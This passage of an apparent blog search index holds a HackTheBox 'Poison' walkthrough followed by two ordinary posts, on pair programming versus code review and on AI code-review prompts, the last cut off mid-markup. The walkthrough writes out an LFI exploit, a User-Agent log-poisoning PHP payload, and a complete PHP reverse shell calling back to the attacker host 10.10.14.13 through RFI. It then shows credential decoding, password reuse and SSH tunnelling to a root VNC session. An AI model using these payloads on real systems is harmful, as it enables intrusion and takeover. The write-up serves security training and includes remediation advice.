(@firefart) =============================================================== [+] Url: http://10.10.10.84 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/09/15 10:15:30 Starting gobuster =============================================================== /browse.php (Status: 200) [Size: 289] /index.php (Status: 200) [Size: 289] /info.php (Status: 200) [Size: 68315] /ini.php (Status: 200) [Size: 75] /phpinfo.php (Status: 200) [Size: 68315] =============================================================== 2023/09/15 10:17:22 Finished =============================================================== The browse.php file is particularly interesting. Visiting it shows a file browser interface that accepts a file parameter. Testing with different values reveals it\u0026rsquo;s vulnerable to Local File Inclusion (LFI).\nLocal File Inclusion Testing LFI The browse.php page accepts a file parameter, making it a prime candidate for LFI testing:\n$ curl http://10.10.10.84/browse.php?file=/etc/passwd This returns the contents of /etc/passwd, confirming the LFI vulnerability.\nReading PHP Source I can use PHP filter wrappers to read the source code of PHP files:\n$ curl \u0026#34;http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=browse.php\u0026#34; This returns a base64-encoded version of the PHP source. Decoding it reveals:\n\u0026lt;?php $file = $_GET[\u0026#39;file\u0026#39;]; if(isset($file)) { include(\u0026#34;$file\u0026#34;); } else { include(\u0026#34;index.php\u0026#34;); } ?\u0026gt; The code directly includes whatever file is specified in the file parameter without any filtering, making it highly vulnerable.\nLog Poisoning Since I can include any file, I\u0026rsquo;ll attempt log poisoning by injecting PHP code into the Apache access logs. First, I\u0026rsquo;ll make a request with PHP code in the User-Agent header:\n$ curl \u0026#34;http://10.10.10.84/\u0026#34; -H \u0026#34;User-Agent: \u0026lt;?php system(\\$_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34; Now I can include the access log file and execute commands:\n$ curl \u0026#34;http://10.10.10.84/browse.php?file=/var/log/httpd-access.log\u0026amp;cmd=id\u0026#34; This successfully executes the id command, showing:\nShell via RFI Creating Reverse Shell Since command execution through log poisoning can be unstable, I\u0026rsquo;ll use Remote File Inclusion (RFI) to get a more reliable shell. First, I\u0026rsquo;ll create a PHP reverse shell:\n\u0026lt;?php set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.10.14.13\u0026#39;; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } chdir(\u0026#34;/\u0026#34;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; Serving the Shell I\u0026rsquo;ll serve the shell file using Python\u0026rsquo;s built-in HTTP server:\n$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Setting up Listener In another terminal, I\u0026rsquo;ll set up a netcat listener:\n$ nc -nlvp 9001 listening on [any] 9001 ... Triggering the RFI Now I\u0026rsquo;ll trigger the RFI by including my hosted PHP file:\n$ curl \u0026#34;http://10.10.10.84/browse.php?file=http://10.10.14.13:8000/shell.php\u0026#34; This gives me a shell as the www user:\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.10.84] 64838 FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64 2:15PM up 2 mins, 0 users, load averages: 0.09, 0.16, 0.08 uid=80(www) gid=80(www) groups=80(www) /usr/local/www/apache24/data $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; Enumeration as www Finding User Credentials Now that I have a shell, I\u0026rsquo;ll enumerate the system. Looking in the /home directory:\n$ ls /home charix $ ls -la /home/charix total 41 drwxr-xr-x 2 charix charix 512 Mar 19 2018 . drwxr-xr-x 3 root wheel 512 Mar 19 2018 .. -rw-r--r-- 1 charix charix 87 Mar 19 2018 .history -rw-r--r-- 1 charix charix 771 Mar 19 2018 .shrc -rw-r----- 1 charix charix 33 Mar 19 2018 user.txt -rw-r--r-- 1 root root 166 Mar 19 2018 secret.zip I can\u0026rsquo;t read user.txt yet, but there\u0026rsquo;s a secret.zip file. Let me also check the web directory:\n$ ls -la /usr/local/www/apache24/data total 36 drwxr-xr-x 2 www www 512 Mar 19 2018 . drwxr-xr-x 3 www www 512 Jan 24 2018 .. -rw-r--r-- 1 www www 289 Mar 19 2018 browse.php -rw-r--r-- 1 www www 289 Mar 19 2018 index.php -rw-r--r-- 1 www www 68 Mar 19 2018 info.php -rw-r--r-- 1 www www 289 Mar 19 2018 ini.php -rw-r--r-- 1 www www 78 Mar 19 2018 listfiles.php -rw-r--r-- 1 www www 935 Mar 19 2018 phpinfo.php -rw-r--r-- 1 www www 68 Mar 19 2018 pwdbackup.txt There\u0026rsquo;s a pwdbackup.txt file! Let me examine it:\n$ cat pwdbackup.txt This password is secure, it\u0026#39;s encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1VWWnRjRWRUTWxKSVZsaG9XMkV4Y0hKWFZscHJWakpHYzFOc1dtRlRSbVJWVFZkU1QxWnRSblZVYmxKaFVubEtSMFpHV25SVlJFcG9aV3hhVmxkc1VsUlphbXhhVTJ0a1IxSXhWalZhUkZaS1drWmFVbGt4Vm1wU2JFRjRVVVF3UVE9PQ== This looks like Base64 encoded data that\u0026rsquo;s been encoded multiple times. Let me decode it:\n$ data=$(cat pwdbackup.txt | tail -1); for i in $(seq 1 13); do data=$(echo $data | base64 -d); done; echo $data Charix!2#4%6\u0026amp;8(0 Perfect! Now I have the password for the charix user: Charix!2#4%6\u0026amp;8(0\nSSH as charix I can now SSH into the system as charix:\n$ ssh charix@10.10.10.84 Password for charix@Poison: Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017 Welcome to FreeBSD! charix@Poison:~ % cat user.txt eaacdf[...]7aa428 Now I can read the user flag. I also notice the secret.zip file in the home directory:\ncharix@Poison:~ % ls -la total 41 drwxr-xr-x 2 charix charix 512 Mar 19 2018 . drwxr-xr-x 3 root wheel 512 Mar 19 2018 .. -rw-r--r-- 1 charix charix 87 Mar 19 2018 .history -rw-r--r-- 1 charix charix 771 Mar 19 2018 .shrc -rw-r----- 1 charix charix 33 Mar 19 2018 user.txt -rw-r--r-- 1 root root 166 Mar 19 2018 secret.zip charix@Poison:~ % unzip secret.zip Archive: secret.zip [secret.zip] secret password: The zip file is password protected. Let me try the same password I just found:\ncharix@Poison:~ % unzip secret.zip Archive: secret.zip [secret.zip] secret password: extracting: secret charix@Poison:~ % file secret secret: Non-ISO extended-ASCII text charix@Poison:~ % xxd secret 00000000: bdcb 7a4b 27f0 6a65 d827 2b44 7ae7 7b6d ..zK\u0026#39;.je.\u0026#39;+D~.{m This appears to be some kind of binary file. Let me keep this for later use.\nPrivilege Escalation Discovering VNC Let me check what processes are running on the system:\ncharix@Poison:~ % ps aux | grep -v \u0026#34;[\u0026#34; USER PID %CPU %MEM VSZ RSS TT STAT STARTED TIME COMMAND root 11 0.0 0.0 0 0 - RL 22:36 0:00.08 idle root 529 0.0 0.1 10484 2044 - Is 22:36 0:00.01 /usr/sbin/syslogd -s root 620 0.0 0.2 56320 4032 - I 22:36 0:00.02 /usr/local/bin/python /usr/local/bin/supervisord -c /usr/local/etc/supervisord.conf root 819 0.0 0.6 67220 12588 - I 22:36 0:00.04 /usr/local/bin/Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1 root 851 0.0 0.1 9584 2392 - Is 22:36 0:00.01 /usr/sbin/cron -s charix 2303 0.0 0.2 19660 3352 0 I+ 22:52 0:00.01 /usr/bin/su - Interesting! There\u0026rsquo;s a VNC server (Xvnc) running as root on port 5901, but it\u0026rsquo;s bound to localhost only (-localhost flag). The process also uses -rfbauth /root/.vnc/passwd for authentication.\nLet me also check what ports are listening:\ncharix@Poison:~ % netstat -an | grep LISTEN tcp4 0 0 127.0.0.1.25 *.* LISTEN tcp4 0 0 *.80 *.* LISTEN tcp6 0 0 *.80 *.* LISTEN tcp4 0 0 *.22 *.* LISTEN tcp6 0 0 *.22 *.* LISTEN tcp4 0 0 127.0.0.1.5801 *.* LISTEN tcp4 0 0 127.0.0.1.5901 *.* LISTEN tcp4 0 0 *.110 *.* LISTEN tcp6 0 0 *.110 *.* LISTEN tcp4 0 0 *.119 *.* LISTEN tcp6 0 0 *.119 *.* LISTEN Perfect! VNC is listening on ports 5801 (HTTP) and 5901 (VNC) on localhost. The secret file I found earlier is likely the VNC password file.\nSetting up SSH Tunnel Since VNC is only accessible from localhost, I\u0026rsquo;ll create an SSH tunnel to access it from my attacking machine:\n$ ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84 This forwards my local port 5901 to the target\u0026rsquo;s localhost:5901.\nConnecting to VNC Now I can connect to VNC using the secret file as the password:\n$ vncviewer 127.0.0.1:5901 -passwd secret The VNC connection is successful! I can see the desktop environment running as root.\nFrom the VNC desktop, I can open a terminal and access the root flag:\nroot@Poison:~ # cat /root/root.txt 716d[...]92ba The secret file contained the VNC password in the proper encrypted format that VNC expects. With VNC access as root, I have complete control over the system.\nThis walkthrough demonstrated: Reconnaissance: Nmap scanning revealed SSH, SMTP, HTTP, POP3, and NNTP services running on FreeBSD. Web Enumeration: Directory brute-forcing discovered vulnerable browse.php file browser. LFI Exploitation: PHP filter wrappers exposed source code and enabled log poisoning attacks. Log Poisoning: Injecting PHP code into Apache access logs for remote code execution. RFI Exploitation: Remote file inclusion provided more stable shell access than log poisoning. Credential Discovery: Multiple base64 encoded password found in web directory backup file. Privilege Escalation: Process enumeration revealed VNC server running as root on localhost. SSH Tunneling: Port forwarding enabled access to localhost-bound VNC service. VNC Access: Encrypted password file provided root desktop access for flag capture. Key Lessons: Web Application Security Never store credentials in web-accessible directories: The pwdbackup.txt file should never have been in the web root - even with obfuscation Input validation is critical: The browse.php file parameter lacked proper sanitization and filtering LFI vulnerabilities are extremely dangerous: Direct file inclusion without filtering leads to immediate system compromise Directory traversal attacks are still prevalent: ../ sequences bypassed basic filtering attempts Log Poisoning \u0026amp; RFI Techniques Log poisoning is a reliable LFI escalation technique: Web server logs provide a writable target for PHP injection User-Agent headers are prime targets: HTTP headers often logged without sanitization RFI provides more stable access: Remote file inclusion offered better shell stability than log poisoning PHP filter wrappers expose source code: php://filter/convert.base64-encode reveals application logic Privilege Escalation Insights Process enumeration reveals attack surfaces: Services bound to localhost can be accessed through SSH tunneling Service isolation matters: VNC running as root violates the principle of least privilege Network service binding is security-relevant: Localhost-only binding prevented direct access but SSH tunneling bypassed this Encrypted files aren\u0026rsquo;t always secure: The VNC password file used weak encryption easily bypassed Password \u0026amp; Authentication Weaknesses Multiple encoding layers don\u0026rsquo;t provide security: Obfuscation through repeated base64 encoding is easily defeated Password reuse is dangerous: The same password worked for multiple services and files Weak VNC authentication: Simple password-based VNC access provided full root desktop control Credential discovery through enumeration: Systematic file enumeration revealed multiple password sources System Administration Failures Unnecessary services increase attack surface: VNC server wasn\u0026rsquo;t required for normal operations Backup files contain sensitive data: The backup directory exposed critical system information File permissions were overly permissive: Many files readable by web server process Default configurations often insecure: Services running with excessive privileges by default Remediation: Implement proper input validation and sanitization for all file parameters Use whitelist-based file access instead of direct inclusion Remove backup files and credentials from web-accessible directories Configure services to run with minimal required privileges Implement proper network segmentation and access controls Use strong authentication mechanisms instead of simple password files Regular security audits to identify exposed services and misconfigurations Happy hacking!\n","permalink":"https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/","summary":"Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root.","title":"HackTheBox: Poison Walkthrough"},{"content":"The False Dichotomy A common misconception in software development is that pair programming eliminates the need for code reviews. The argument goes: \u0026ldquo;We pair program, so we don\u0026rsquo;t need code reviews.\u0026rdquo;\nHowever, this thinking represents a false dichotomy. Both practices serve important but distinct purposes in maintaining code quality and knowledge sharing.\nWhy Pair Programming Isn\u0026rsquo;t Enough Limited Perspective During Development When two developers pair program, they\u0026rsquo;re focused on:\nSolving the immediate problem Getting the code to work Making decisions in real-time This intense focus can create blind spots that become apparent only with fresh eyes and hindsight.\nMissing the Forest for the Trees During active development, pairs are often deep in implementation details. They may miss:\nArchitectural implications Integration concerns Alternative approaches Long-term maintainability issues Time Pressure and Context Pair programming sessions often have time constraints and specific goals. This environment doesn\u0026rsquo;t always allow for:\nThorough consideration of edge cases Comprehensive security analysis Performance optimization discussions Documentation review The Unique Value of Code Reviews Fresh Perspective Code reviewers who didn\u0026rsquo;t write the code bring:\nUnbiased viewpoint: No emotional attachment to implementation decisions Different experiences: Alternative solutions based on varied backgrounds Clearer thinking: Not mentally fatigued from active development Systematic Analysis Code reviews allow for:\nMethodical examination: Line-by-line analysis without time pressure Pattern recognition: Identifying recurring issues across the codebase Quality gates: Ensuring standards are met before merge Knowledge Distribution Reviews facilitate:\nKnowledge sharing: Exposing more team members to different parts of the system Learning opportunities: Junior developers learn from senior reviewers Documentation: Creating a record of decisions and discussions What Code Reviews Catch That Pairing Misses Security Vulnerabilities Fresh reviewers often spot:\nInput validation gaps Authentication bypasses Data exposure risks Injection vulnerabilities Performance Issues Reviewers can identify:\nInefficient algorithms Resource leaks Unnecessary computations Scaling bottlenecks User Experience Problems External perspective helps catch:\nConfusing user interfaces Missing error messages Accessibility issues Edge case handling Code Clarity Reviewers assess:\nVariable naming clarity Function complexity Documentation adequacy Code organization The Complementary Approach Pair Programming Strengths Real-time collaboration Immediate feedback Knowledge transfer during development Reduced debugging time Higher initial quality Code Review Strengths Systematic quality assurance Fresh perspective analysis Documentation and discussion trail Broader team involvement Comprehensive security review Best Practices: Combining Both 1. Pair for Complex Features Use pair programming for:\nCritical business logic Complex algorithms New technology adoption Knowledge transfer sessions 2. Review Everything Maintain code reviews for:\nAll production code Configuration changes Documentation updates Third-party integrations 3. Adjust Review Depth For pair-programmed code:\nFocus on architecture and design Emphasize security and performance Check for missing documentation Verify test coverage 4. Leverage Reviewers\u0026rsquo; Expertise Assign reviews based on:\nDomain knowledge Security expertise Performance optimization skills User experience understanding Measuring Effectiveness Track both practices with metrics like:\nPair Programming:\nCode quality improvement Knowledge sharing effectiveness Development velocity Bug reduction in development Code Reviews:\nDefects caught before production Security vulnerabilities identified Knowledge distribution across team Review cycle time Common Pitfalls to Avoid Over-relying on Pairing Assuming pairs catch everything Skipping systematic reviews Missing broader team input Redundant Reviews Nitpicking formatting already handled Re-reviewing well-paired code excessively Focusing on style over substance Process Overhead Making reviews too bureaucratic Requiring unnecessary approvals Slowing down simple changes Conclusion Pair programming and code reviews are complementary practices that strengthen each other:\nPair programming improves code quality during development through real-time collaboration Code reviews provide systematic quality assurance and fresh perspective analysis The most effective teams use both practices strategically, understanding that each serves unique purposes in maintaining high-quality, secure, and maintainable code.\nRemember: The goal isn\u0026rsquo;t to choose between pair programming and code reviews‚Äîit\u0026rsquo;s to leverage both for maximum effectiveness in your development process.\n","permalink":"https://realspaceeagle.github.io/posts/pair-programming-vs-code-reviews/","summary":"\u003ch2 id=\"the-false-dichotomy\"\u003eThe False Dichotomy\u003c/h2\u003e\n\u003cp\u003eA common misconception in software development is that pair programming eliminates the need for code reviews. The argument goes: \u003cem\u003e\u0026ldquo;We pair program, so we don\u0026rsquo;t need code reviews.\u0026rdquo;\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eHowever, this thinking represents a false dichotomy. Both practices serve important but distinct purposes in maintaining code quality and knowledge sharing.\u003c/p\u003e\n\u003ch2 id=\"why-pair-programming-isnt-enough\"\u003eWhy Pair Programming Isn\u0026rsquo;t Enough\u003c/h2\u003e\n\u003ch3 id=\"limited-perspective-during-development\"\u003eLimited Perspective During Development\u003c/h3\u003e\n\u003cp\u003eWhen two developers pair program, they\u0026rsquo;re focused on:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSolving the immediate problem\u003c/li\u003e\n\u003cli\u003eGetting the code to work\u003c/li\u003e\n\u003cli\u003eMaking decisions in real-time\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis intense focus can create blind spots that become apparent only with fresh eyes and hindsight.\u003c/p\u003e","title":"Pair Programming vs Code Reviews: Why Both Matter"},{"content":"The Future of Code Reviews: AI-Assisted Analysis Modern AI tools like Claude, GPT-4, and specialized code analysis models are revolutionizing how we approach code reviews. With the right prompts, AI can provide comprehensive, consistent, and thorough code analysis that complements human expertise.\nComprehensive Code Review Prompt Here\u0026rsquo;s a powerful prompt structure for AI-powered code reviews:\n\u0026lt;role\u0026gt;You are a code review specialist.\u0026lt;/role\u0026gt; \u0026lt;context\u0026gt; Perform a comprehensive review of the provided [PIECE OF CODE]. \u0026lt;/context\u0026gt; \u0026lt;steps\u0026gt; 1. Evaluate the code for efficiency, readability, and maintainability. 2. Identify bugs, security issues, or potential vulnerabilities. 3. Check for adherence to best practices and coding standards. 4. Suggest improvements for performance and optimization. 5. Assess error handling and edge cases. 6. Review naming conventions and code organization. 7. Provide specific, actionable recommendations. \u0026lt;/steps\u0026gt; \u0026lt;output_format\u0026gt; ## Code Review Summary ### Strengths - [List positive aspects] ### Issues Found - **Security**: [Security concerns] - **Bugs**: [Potential bugs or errors] - **Performance**: [Performance issues] - **Maintainability**: [Code maintenance concerns] ### Recommendations 1. [Specific improvement suggestions] 2. [Best practice recommendations] 3. [Refactoring suggestions] ### Code Quality Score: X/10 \u0026lt;/output_format\u0026gt; Advanced Refactoring Prompt For code improvement and refactoring, use this comprehensive prompt:\nYou are a skilled software engineer with deep expertise in code refactoring and optimization across multiple programming languages. Your task is to: 1. **Analyze** the provided code for inefficiencies, readability issues, and potential improvements 2. **Refactor** the code to improve: - Readability and clarity - Performance and efficiency - Modularity and reusability - Error handling and robustness 3. **Add meaningful comments** explaining complex logic 4. **Follow best practices** for the specific programming language 5. **Maintain functionality** while improving code quality Provide the refactored code with explanations for each improvement made. Language-Specific Review Prompts Python Code Review Review this Python code focusing on: - PEP 8 compliance - Pythonic idioms and best practices - Type hints and documentation - Error handling with appropriate exceptions - Performance optimizations (list comprehensions, generators) - Security vulnerabilities (input validation, SQL injection) JavaScript/TypeScript Review Analyze this JavaScript/TypeScript code for: - ES6+ modern syntax usage - Type safety and TypeScript best practices - Async/await vs Promise handling - Memory leaks and performance issues - Cross-site scripting (XSS) vulnerabilities - Bundle size optimization opportunities Security-Focused Review Perform a security-focused code review examining: - Input validation and sanitization - Authentication and authorization flaws - SQL injection vulnerabilities - Cross-site scripting (XSS) risks - Insecure data storage or transmission - Dependency vulnerabilities - Information disclosure risks AI Review Integration Workflow 1. Pre-Review Analysis Run AI analysis on code changes Generate automated suggestions Flag potential security issues 2. Human Review Enhancement Use AI insights to guide manual review Focus human attention on complex logic Verify AI recommendations 3. Continuous Improvement Track AI suggestion accuracy Refine prompts based on outcomes Build custom rules for your codebase Best Practices for AI Code Reviews Do\u0026rsquo;s ‚úÖ Use structured prompts for consistency ‚úÖ Combine AI analysis with human expertise ‚úÖ Customize prompts for your tech stack ‚úÖ Review AI suggestions critically ‚úÖ Update prompts based on experience Don\u0026rsquo;ts ‚ùå Rely solely on AI without human oversight ‚ùå Ignore context-specific requirements ‚ùå Apply generic suggestions blindly ‚ùå Skip testing AI-suggested changes ‚ùå Compromise on security validation Measuring AI Review Effectiveness Track these metrics to improve your AI-assisted review process:\nDefect Detection Rate: Issues found by AI vs. missed issues False Positive Rate: Incorrect AI suggestions Review Time Reduction: Time saved using AI assistance Code Quality Improvement: Measurable quality metrics Developer Satisfaction: Team feedback on AI assistance Conclusion AI-powered code reviews are not meant to replace human reviewers but to augment and enhance the review process. By using structured prompts and combining AI analysis with human expertise, teams can achieve:\nMore consistent review quality Faster identification of common issues Better focus on complex architectural decisions Improved code security and performance The key is to continuously refine your prompts and integrate AI insights thoughtfully into your development workflow.\n","permalink":"https://realspaceeagle.github.io/posts/ai-powered-code-review-prompts/","summary":"\u003ch2 id=\"the-future-of-code-reviews-ai-assisted-analysis\"\u003eThe Future of Code Reviews: AI-Assisted Analysis\u003c/h2\u003e\n\u003cp\u003eModern AI tools like Claude, GPT-4, and specialized code analysis models are revolutionizing how we approach code reviews. With the right prompts, AI can provide comprehensive, consistent, and thorough code analysis that complements human expertise.\u003c/p\u003e\n\u003ch2 id=\"comprehensive-code-review-prompt\"\u003eComprehensive Code Review Prompt\u003c/h2\u003e\n\u003cp\u003eHere\u0026rsquo;s a powerful prompt structure for AI-powered code reviews:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;role\u0026gt;You are a code review specialist.\u0026lt;/role\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;context\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePerform a comprehensive review of the provided [PIECE OF CODE].\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/context\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;steps\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e1.\u003c/span\u003e Evaluate the code for efficiency, readability, and maintainability.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e2.\u003c/span\u003e Identify bugs, security issues, or potential vulnerabilities.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e3.\u003c/span\u003e Check for adherence to best practices and coding standards.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e4.\u003c/span\u003e Suggest improvements for performance and optimization.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e5.\u003c/span\u003e Assess error handling and edge cases.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e6.\u003c/span\u003e Review naming conventions and code organization.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e7.\u003c/span\u003e Provide specific, actionable recommendations.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/steps\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;output_format\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e## Code Review Summary\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e### Strengths\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003e-\u003c/span\u003e [List positive aspects]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e### Issues Found\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003e-\u003c/span\u003e **Security**: [Security concerns]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e-\u003c/span\u003e **Bugs**: [Potential bugs or errors]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e-\u003c/span\u003e **Performance**: [Performance issues]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e-\u003c/span\u003e **Maintainability**: [Code maintenance concerns]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e### Recommendations\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003e1.\u003c/span\u003e [Specific improvement suggestions]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e2.\u003c/span\u003e [Best practice recommendations]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e3.\u003c/span\u003e [Refactoring suggestions]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e### Code Quality Score: X/10\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gu\"\u003e\u003c/span\u003e\u0026lt;/output_format\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 